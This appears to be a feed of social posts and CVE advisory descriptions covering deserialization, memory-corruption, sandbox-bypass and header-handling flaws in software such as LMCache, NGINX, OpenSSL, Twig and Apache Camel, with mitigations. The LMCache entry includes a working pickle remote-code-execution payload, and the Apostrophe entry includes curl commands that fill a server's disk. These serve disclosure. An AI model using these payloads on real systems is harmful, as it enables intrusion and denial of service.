posts.content: CVE-2026-94093: insecure deserialization in DLR-RM stable-baselines3 (PPO.load, load_replay_buffer, VecNormalize.load) enables remote code execution. CVSS 6.3. Public exploit exists, patch status unknown. Update immediately. #CVE #infosec #cybersecurity https://www.valtersit.com/cve/CVE-2026-94093/

CVE-2026-94093.description: A security vulnerability has been detected in DLR-RM stable-baselines3 up to 2.9.0. This affects the function PPO.load/load_replay_buffer/VecNormalize.load of the file save_util.py. Such manipulation leads to deserialization. It is possible to launch the attack remotely. The exploit has been disclosed publicly and may be used. In v2.9.0 the PyTorch tensor load path is hardened (weights_only=True), but that hardening was later reverted on master via PR #1913 "Hotfix: revert loading with weights_only=True" [blocked] to fix PyTorch 1.13 compat - so even the one "safe" path is inconsistent across versions. #2281 was closed as a duplicate of #1831 since both are unsafe pickle deserialization - but #1831's fix (PR #41) only gated the Hugging Face Hub loader in the separate huggingface_sb3 package. This finding covers the core stable_baselines3 load APIs (PPO.load, load_replay_buffer, VecNormalize.load), which have no safe mode or gate and remained exploitable in v2.9.0 until the outstanding hardening (PR #2264) ships.

A vulnerability in CRI-O checkpoint restore allows a user who can create a pod from a malicious checkpointed container to bypass the destination Kubernetes security context. The restored process may retain credentials, Linux capabilities, no_new_privs, and seccomp state from the checkpoint instead of enforcing the destination configuration. Exploitation requires permission to create a pod from a malicious checkpoint image and checkpoint restore functionality to be available.

CVE-2025-69420.description:
Issue summary: A type confusion vulnerability exists in the TimeStamp Response
verification code where an ASN1_TYPE union member is accessed without first
validating the type, causing an invalid or NULL pointer dereference when
processing a malformed TimeStamp Response file.

Impact summary: An application calling TS_RESP_verify_response() with a
malformed TimeStamp Response can be caused to dereference an invalid or
NULL pointer when reading, resulting in a Denial of Service.

The functions ossl_ess_get_signing_cert() and ossl_ess_get_signing_cert_v2()
access the signing cert attribute value without validating its type.
When the type is not V_ASN1_SEQUENCE, this results in accessing invalid memory
through the ASN1_TYPE union, causing a crash.

Exploiting this vulnerability requires an attacker to provide a malformed
TimeStamp Response to an application that verifies timestamp responses. The
TimeStamp protocol (RFC 3161) is not widely used and the impact of the
exploit is just a Denial of Service. For these reasons the issue was
assessed as Low severity.

The FIPS modules in 3.5, 3.4, 3.3 and 3.0 are not affected by this issue,
as the TimeStamp Response implementation is outside the OpenSSL FIPS module
boundary.

OpenSSL 3.6, 3.5, 3.4, 3.3, 3.0 and 1.1.1 are vulnerable to this issue.

OpenSSL 1.0.2 is not affected by this issue.

F5 Issues Emergency Patches for Critical NGINX Code Execution Flaws

F5 released emergency patches for three critical NGINX vulnerabilities (CVE-2026-15176, CVE-2026-97205, and CVE-2026-93479) that allow unauthenticated remote code execution and denial-of-service attacks.

**If you run NGINX in any form (open-source web server, NGINX Plus, Ingress Controller, Gateway Fabric, or the NGINX WAF/App Protect products), install F5's latest security patches ASAP. If you can't patch, turn off Server Side Includes and asynchronous file I/O, and have your team remove alias directives that use $request_filename and switch regex maps to named captures until the patch is in.**
#cybersecurity #infosec #advisory #vulnerability
https://beyondmachines.net/event_details/f5-issues-emergency-patches-for-critical-nginx-code-execution-flaws-p-9-m-u-w/gD2P6Ple2L

CVE-2026-97205.description:
NGINX Plus and NGINX Open Source have a vulnerability in the ngx_http_core_module module. When asynchronous file I/O (AIO) is enabled in certain configurations, processing a Server Side Includes (SSI) page containing “include virtual” commands may trigger a Use-After-Free (UAF) in the NGINX worker process. This may cause memory corruption or a worker process crash. Additionally, attackers can execute code on systems with Address Space Layout Randomization (ASLR) disabled or when the attacker can bypass ASLR.

Impact:
This vulnerability may allow remote attackers to cause a denial-of-service (DoS) on the NGINX system, corrupt its memory, or possibly trigger code execution. There is no control plane exposure; this is a data plane issue only.




Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.

F5 Issues Emergency Patches for Critical NGINX Code Execution Flaws

F5 released emergency patches for three critical NGINX vulnerabilities (CVE-2026-15176, CVE-2026-97205, and CVE-2026-93479) that allow unauthenticated remote code execution and denial-of-service attacks.

**If you run NGINX in any form (open-source web server, NGINX Plus, Ingress Controller, Gateway Fabric, or the NGINX WAF/App Protect products), install F5's latest security patches ASAP. If you can't patch, turn off Server Side Includes and asynchronous file I/O, and have your team remove alias directives that use $request_filename and switch regex maps to named captures until the patch is in.**
#cybersecurity #infosec #advisory #vulnerability
https://beyondmachines.net/event_details/f5-issues-emergency-patches-for-critical-nginx-code-execution-flaws-p-9-m-u-w/gD2P6Ple2L

CVE-2026-15176.description:
A vulnerability exists in NGINX Plus and NGINX Open Source when a location is configured that uses the alias directive together with rewrite and a set or return directive referencing the $request_filename variable. Alternatively, the same result could be achieved when the $request_filename variable is used in an access log format directive. An unauthenticated attacker along with conditions beyond their control can exploit this vulnerability by sending crafted HTTP requests. This may cause a heap buffer overflow in the NGINX worker process leading to a restart. Additionally, attackers can execute code on systems with Address Space Layout Randomization (ASLR) disabled or when the attacker can bypass ASLR.

Impact:
This vulnerability may allow remote attackers to cause a denial-of-service (DoS) on the NGINX system or to possibly trigger a code execution. There is no control plane exposure; this is a data plane issue only.




Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's JPEG decoder can write a full-width scanline into a buffer sized for a requested draft scale. ImagingJpegDecode does not verify libjpeg's actual output width and component count after scaling is requested, and an 8-bit lossless SOF3 JPEG decoded by a build linked to libjpeg-turbo 3.x can ignore the requested downscaling geometry. An attacker can supply such a JPEG to an application that uses draft() or thumbnail() to request downscaling. This can corrupt heap memory, crash the process, or potentially allow code execution. Older libjpeg-turbo 2.x and IJG builds reject the SOF3 input. This issue is fixed in version 13.0.0.

Mitigating CVE-2026-111943 on #Debian:

- sudo dpkg-reconfigure ca-certificates

- Select "ask" and deselect the following entries:
mozilla/emSign_ECC_Root_CA_-_C3.crt
mozilla/emSign_ECC_Root_CA_-_G3.crt
mozilla/emSign_Root_CA_-_C1.crt
mozilla/emSign_Root_CA_-_G1.crt
mozilla/Comodo_AAA_Services_root.crt

- Hit <Ok>

Alternatively you can edit /etc/ca-certificates.conf manually and add the specific entries:

!mozilla/emSign_ECC_Root_CA_-_C3.crt
!mozilla/emSign_ECC_Root_CA_-_G3.crt
!mozilla/emSign_Root_CA_-_C1.crt
!mozilla/emSign_Root_CA_-_G1.crt
!mozilla/Comodo_AAA_Services_root.crt

...and sudo update-ca-certificates

Please do note that disabling these certificates may also result in collateral damage. That is, sites that happen to use intermediate certificates signed by these root certificates will cease to validate.

posts.content: CVE-2026-46633: Proving exploitability of Twig sandbox bypass https://gist.github.com/vladko312/d61b950f168c791db4786b83dc7a81e6

CVE-2026-46633.description:
### Description

`Compiler::string()` escapes `"`, `$`, `\`, NUL and TAB when generating PHP double-quoted string literals, but does not escape single quotes. In `ModuleNode::compileConstructor()`, the template name from a `{% use %}` tag is compiled via `subcompile()` -> `string()` and placed inside a surrounding PHP single-quoted string literal. A template name containing a single quote terminates that surrounding string early, allowing arbitrary PHP expressions to be injected into the compiled cache file.

The injected code executes within the PHP process when the cache file is first loaded, bypassing the Twig sandbox entirely and achieving remote code execution. `SecurityPolicy` unconditionally allows `{% use %}` regardless of the configured `allowedTags`, so this primitive is reachable from sandboxed templates as well.

### Resolution

`Compiler::string()` now also escapes single quotes so that template names placed inside single-quoted PHP literals can no longer break out of the surrounding context.

### Credits

Twig would like to thank Anvil Secure in collaboration with Claude and Anthropic Research for reporting the issue and providing the fix.

CVE-2026-111767.description:
### Summary
In affected versions, the experimental tasks feature (`taskStore`) did not check which session created a task. Clients sharing one `InMemoryTaskStore` could list, read and cancel each other's tasks.

Experimental tasks are deprecated. The 2026-07-28 specification replaced them with a redesigned extension. The best course of action is to stop using them.

### Am I affected?
Only if your HTTP server passes `taskStore` to `McpServer` or `Server`. If `grep -ri taskstore --exclude-dir=node_modules .` finds nothing, you are not affected.

Affected versions: `@modelcontextprotocol/sdk` 1.24.0 through 1.31.0. The 2.x packages are not affected.

### Fix
Upgrade to `@modelcontextprotocol/sdk` 1.32.0 or later. Each task is now tied to the session that created it, so a client that starts a new session can no longer reach its earlier tasks.

If you cannot upgrade yet, remove `taskStore`, or create one `InMemoryTaskStore` per session.

CVE-2026-113658.description:
### Summary

A rejected upload can remain in the operating system temporary directory.

Multer writes the file before its extension is checked, and the rejection path does not remove that temporary file. An unauthenticated requester can repeat this with large files and steadily consume temporary disk space.

### Details

The endpoint is:

```text
POST /api/v1/@apostrophecms/rich-text-widget/generate-csv-table
```

In `packages/apostrophe/modules/@apostrophecms/rich-text-widget/lib/apiRoutes.js`, Multer first writes the upload to `os.tmpdir()`. The handler then rejects filenames whose extension is not `csv`, but there is no cleanup of the Multer file on this error path.

The route does not require an authenticated user. A normal CSRF cookie is sufficient.

During testing, the request returned HTTP 400 with `Only csv files are supported`, while the complete uploaded content remained in a randomly named file in the configured temporary directory after the response.

### Relationship to prior public work

I reviewed [PR #5013](https://github.com/apostrophecms/apostrophe/pull/5013), which migrated the Rich Text CSV upload path from `connect-multiparty` to Multer. This report concerns cleanup after that migration: the rejected Multer file remains on disk, a behavior not described in the PR or its review discussion.

### POC

Create a small test file. A larger file can be used to demonstrate disk growth, but 1 MiB is enough for a safe local reproduction:

```bash
dd if=/dev/zero of=rejected.txt bs=1M count=1
```

Obtain the normal site cookies and send the rejected upload:

```bash
curl -c cookies.txt 'http://127.0.0.1:3000/' > /dev/null

curl -i -b cookies.txt \
  -F 'file=@rejected.txt;filename=rejected.txt;type=text/plain' \
  'http://127.0.0.1:3000/api/v1/@apostrophecms/rich-text-widget/generate-csv-table'
```

The response is HTTP 400. Compare the contents of the system temporary directory before and after the request:

```bash
ls -lt /tmp
```

A new randomly named file remains present and contains the uploaded bytes.

No login is required. Repeating the multipart request creates additional persistent temporary files.

### Impact

A remote unauthenticated attacker can fill the partition used by the operating system temporary directory. Once that partition is exhausted, Apostrophe and unrelated services on the same host may fail to upload files, create temporary data, or continue operating normally.

The attack requires only repeated HTTP requests and the stored files remain after each rejected response.

CVE-2026-105192.description:
### Summary

LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport



### Details

LMCache multiprocess mode, also called distributed mode, opens an unauthenticated ZeroMQ ROUTER so worker processes can register and share KV cache blocks. The intended clients are sibling LMCache processes. There is no CURVE, ZAP, password, or message authentication on that socket. LMCache used only inside a vLLM process does not open this port. The transport binds to localhost unless the operator sets a routable address with --host, which is how multi-node deployments let peers connect. The 9.8 score is for that routable configuration. A stock single-host install that leaves the default bind is not reachable from other machines.

Messages on the socket are msgpack. Extension code 1 is registered for DeviceIPCWrapper and is passed to DeviceIPCWrapper.Deserialize in lmcache/v1/platform/base/ipc_wrapper.py, which calls pickle.loads. That hook runs from ext_hook in lmcache/v1/multiprocess/custom_types.py while the server is still decoding REGISTER_KV_CACHE arguments, before the handler runs. A single unauthenticated ZMQ DEALER message to the transport port (default 5555) therefore executes code as the user the LMCache process runs as. Official container images run that process as root.

The decode path shipped in v0.3.9. It is still present in the latest PyPI release, v0.5.5, in the v0.5.6 release candidates through v0.5.6rc3, and on the dev branch as of 2026-10-07. No fixed version has been published.



### Proof of concept

Step 1 - Start multiprocess mode bound to a routable address


This is the documented multi-node setting. The ZMQ transport listens on port 5555.

```
   python -m lmcache.v1.multiprocess.http_server \
    --http-host 127.0.0.1 --http-port 8080 \
    --host 0.0.0.0 --port 5555 \
    --l1-size-gb 0.25 --eviction-policy LRU \
    --hash-algorithm blake3 --instance-id mp-node-01
```
Step 2 - Build a REGISTER_KV_CACHE frame whose cache slot is a pickle


Payload slot 1 is a msgpack extension with code 1. The server unpickles that body while it is still decoding arguments. The command writes id to /tmp/zmq_pwn.

```
import os
import pickle
import msgspec
import zmq

class EvilPayload:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        return (os.system, (self.cmd,))

evil_pickle = pickle.dumps(EvilPayload("id > /tmp/zmq_pwn 2>&1"))

REGISTER_KV_CACHE = 1
EXT_CODE = 1
NUM_PAYLOADS = 7
KVCACHE_INDEX = 1

b_uid = msgspec.msgpack.encode(0)
b_type = msgspec.msgpack.encode(REGISTER_KV_CACHE)
payloads = [msgspec.msgpack.encode(None)] * NUM_PAYLOADS
payloads[0] = msgspec.msgpack.encode(0)
payloads[KVCACHE_INDEX] = msgspec.msgpack.encode(
    [msgspec.msgpack.Ext(EXT_CODE, evil_pickle)]
)
frames = [b_uid, b_type, *payloads]
```
Step 3 - Send the frame


```
ctx = zmq.Context()
s = ctx.socket(zmq.DEALER)
s.connect("tcp://127.0.0.1:5555")
s.send_multipart(frames)
```
The pickle runs during argument decode. The server then logs a type error for REGISTER_KV_CACHE because the handler expected a DeviceIPCWrapper and received the return value of os.system. That error is after the command has already run.


Step 4 - Confirm the command ran as the LMCache user


```
cat /tmp/zmq_pwn
```
Expected output on an official image, where the process runs as root:

```
uid=0(root) gid=0(root) groups=0(root)
```

### Impact

LMCache's multiprocess (MP) mode uses a ZeroMQ transport (port 5555 by default) that does not require authentication. Device IPC descriptors received on this transport were deserialized with `pickle.loads`. An attacker who can reach the transport port can send a single crafted message and execute arbitrary code with the privileges of the LMCache process.

By default the transport binds to localhost, and single-process (in-process) mode does not open the port. Deployments are exposed when the transport binds a routable address, as multi-node setups do. The project's example Kubernetes deployment bound all interfaces, and official container images ran as root, so deployments based on them should be treated as exposed.

Affected: 0.3.9 through 0.5.5, the 0.5.6 release candidates, and `dev` branch builds before PR #5644.


### Patches

Fixed in **0.5.6**. Pickle has been replaced with versioned, typed MessagePack descriptors that are validated before use; the device wrapper type is selected from a fixed local allowlist, and there is no pickle fallback. Both the ZeroMQ and gRPC transport paths are covered.

The wire format has changed: upgrade all workers and servers together.

0.5.6 also binds the example Kubernetes deployment to localhost (PR #5684) and runs official images as a non-root user (PR #5685).

### Workarounds

Until you can upgrade:

- Do not bind the transport to a routable address; keep it on localhost or a trusted cluster network.
- Restrict access to the transport port (5555 by default) with firewall rules or network policies.
- Run LMCache as a non-root user (build from the provided Dockerfile if needed).

If the transport port was ever reachable from an untrusted network, treat the host as potentially compromised: review connections to the port, check for unexpected processes or outbound connections from the LMCache process, rotate reachable credentials, and redeploy from clean images.

CVE-2025-15467.description:
Issue summary: Parsing CMS AuthEnvelopedData message with maliciously
crafted AEAD parameters can trigger a stack buffer overflow.

Impact summary: A stack buffer overflow may lead to a crash, causing Denial
of Service, or potentially remote code execution.

When parsing CMS AuthEnvelopedData structures that use AEAD ciphers such as
AES-GCM, the IV (Initialization Vector) encoded in the ASN.1 parameters is
copied into a fixed-size stack buffer without verifying that its length fits
the destination. An attacker can supply a crafted CMS message with an
oversized IV, causing a stack-based out-of-bounds write before any
authentication or tag verification occurs.

Applications and services that parse untrusted CMS or PKCS#7 content using
AEAD ciphers (e.g., S/MIME AuthEnvelopedData with AES-GCM) are vulnerable.
Because the overflow occurs prior to authentication, no valid key material
is required to trigger it. While exploitability to remote code execution
depends on platform and toolchain mitigations, the stack-based write
primitive represents a severe risk.

The FIPS modules in 3.6, 3.5, 3.4, 3.3 and 3.0 are not affected by this
issue, as the CMS implementation is outside the OpenSSL FIPS module
boundary.

OpenSSL 3.6, 3.5, 3.4, 3.3 and 3.0 are vulnerable to this issue.

OpenSSL 1.1.1 and 1.0.2 are not affected by this issue.

CVE-2025-69419.description:
Issue summary: Calling PKCS12_get_friendlyname() function on a maliciously
crafted PKCS#12 file with a BMPString (UTF-16BE) friendly name containing
non-ASCII BMP code point can trigger a one byte write before the allocated
buffer.

Impact summary: The out-of-bounds write can cause a memory corruption
which can have various consequences including a Denial of Service.

The OPENSSL_uni2utf8() function performs a two-pass conversion of a PKCS#12
BMPString (UTF-16BE) to UTF-8. In the second pass, when emitting UTF-8 bytes,
the helper function bmp_to_utf8() incorrectly forwards the remaining UTF-16
source byte count as the destination buffer capacity to UTF8_putc(). For BMP
code points above U+07FF, UTF-8 requires three bytes, but the forwarded
capacity can be just two bytes. UTF8_putc() then returns -1, and this negative
value is added to the output length without validation, causing the
length to become negative. The subsequent trailing NUL byte is then written
at a negative offset, causing write outside of heap allocated buffer.

The vulnerability is reachable via the public PKCS12_get_friendlyname() API
when parsing attacker-controlled PKCS#12 files. While PKCS12_parse() uses a
different code path that avoids this issue, PKCS12_get_friendlyname() directly
invokes the vulnerable function. Exploitation requires an attacker to provide
a malicious PKCS#12 file to be parsed by the application and the attacker
can just trigger a one zero byte write before the allocated buffer.
For that reason the issue was assessed as Low severity according to our
Security Policy.

The FIPS modules in 3.6, 3.5, 3.4, 3.3 and 3.0 are not affected by this issue,
as the PKCS#12 implementation is outside the OpenSSL FIPS module boundary.

OpenSSL 3.6, 3.5, 3.4, 3.3, 3.0 and 1.1.1 are vulnerable to this issue.

OpenSSL 1.0.2 is not affected by this issue.

CVE-2026-105299.description:
Summary



Before version 0.9.0, the HTTP/1 upstream path in pingora-proxy passed the downstream request through upstream_request_filter and wrote it to the upstream without removing the client's Connection header, other hop-by-hop headers, or the headers Connection nominated, although RFC 9110 Section 7.6.1 requires intermediaries to remove them. The HTTP/2 upstream path already removed Connection and related HTTP/1-specific headers. A client could therefore nominate a header that the application adds in upstream_request_filter (for example, Connection: keep-alive, X-Forwarded-For). A downstream HTTP/1 intermediary that honors Connection would then strip the Pingora-added header before it reached the origin.




Impact



Specifically affects chained deployments where an HTTP/1 intermediary between Pingora and the origin processes Connection nominations (for example, Go's net/http/httputil.ReverseProxy) and the origin trusts headers added by that intermediary (for example, X-Forwarded-For for IP-based authorization). A remote, unauthenticated attacker can have those headers removed, potentially bypassing authorization. The reporter demonstrated access to an IP-restricted endpoint using X-Forwarded-For for IP validation on the origin. This is the same class of issue as CVE-2022-31813 in Apache HTTP Server.




Note that Cloudflare CDN customers were unaffected, as no such chained deployment as described above exists with internal Pingora services, and Connection headers are sanitized before arriving at Pingora gateways.



Mitigation:

  *  

Upgrade to pingora 0.9.0 or later. By default, Pingora now removes hop-by-hop and Connection-nominated headers from upstream requests, and rejects requests whose Connection header nominates Host, X-Forwarded-For, X-Forwarded-Host, X-Forwarded-Proto, or a pseudo-header. This is controlled by PeerOptions::http_upstream_request_policy (HttpUpstreamRequestPolicy). Fix commits:  https://github.com/cloudflare/pingora/commit/28c18e6b6b04dd0bd937234e5950049e6d74cded ,  https://github.com/cloudflare/pingora/commit/ca23f1668eca8e78be7ba62ef0edbd458b40eeee 


  *  

Do not use HttpUpstreamRequestPolicy::preserve() if the origin relies on headers added by Pingora; it restores the old passthrough behavior.

Details: https://radar.offseq.com/threat/cve-2026-78162-cwe-502-deserialization-of-untrusted-data-in-apache-software-foundation-apache-camel-21ff192d2f57bb7b #OffSeq #ApacheCamel #Vuln #RCE

CVE-2026-78162.description:
Deserialization of Untrusted Data vulnerability in Apache Camel.



This issue affects Apache Camel: from 4.0.0 before 4.18.5, from 4.19.0 before 4.22.1.



The camel-hazelcast component applies a default Hazelcast JavaSerializationFilterConfig to the instances it creates from its own configuration, a protection introduced by CVE-2026-43865. That change did not reach two of the configuration paths Camel builds itself, so those paths continued to create Hazelcast instances whose Java deserialization is unrestricted. ReplicatedHazelcastAggregationRepository extends HazelcastAggregationRepository but overrides doStart() without calling super.doStart(), keeping its own copy of the bootstrap block, and therefore never received the filter: a route using it without supplying a hazelcastInstance starts a Hazelcast member that deserializes values read from the backing ReplicatedMap with no class restriction. HazelcastDefaultComponent#getOrCreateHzClientInstance() builds its own ClientConfig when hazelcastMode=client is selected and neither a referenced ClientConfig nor hazelcastConfigUri is supplied, and likewise applied no filter, so client-mode endpoints behaved differently from node-mode endpoints for an otherwise identical configuration. In both cases an attacker able to publish into the Hazelcast cluster that the affected instance is attached to can cause a serialized Java object of their choosing to be deserialized inside Hazelcast's own serialization layer, before Camel processes the exchange, resulting in remote code execution. Hazelcast clusters have neither authentication nor TLS enabled by default. Selecting client mode is a topology choice rather than a security option, so neither path required the deployment to opt in to unsafe behaviour.



Users are recommended to upgrade to version 4.23.0, which fixes the issue. If users are on the 4.22.x releases stream, then they are suggested to upgrade to 4.22.1. If users are on the 4.18.x releases stream, then they are suggested to upgrade to 4.18.5. The 4.14.x releases stream and earlier reached end of life before this issue was resolved and will not receive a fix, so deployments on those lines must move to a supported release. For deployments that cannot upgrade immediately, supply an explicit Hazelcast configuration carrying a JavaSerializationFilterConfig, or inject a pre-built HazelcastInstance, since a user-supplied configuration is never overwritten by Camel. Alternatively set the JVM-wide filter -Djdk.serialFilter=!java.net.;java.;javax.;org.apache.camel.;!* and enable Hazelcast cluster authentication and TLS to restrict who can reach the cluster.

CVE-2026-16460.description: A flaw was found in bootc and ostree. Already-staged deployments are finalized without revalidating the deployment's container image against the current containers signature policy. Unsigned OS content staged under a prior permissive policy can remain bootable after policy is hardened to reject unsigned images, leading to full host compromise on reboot.
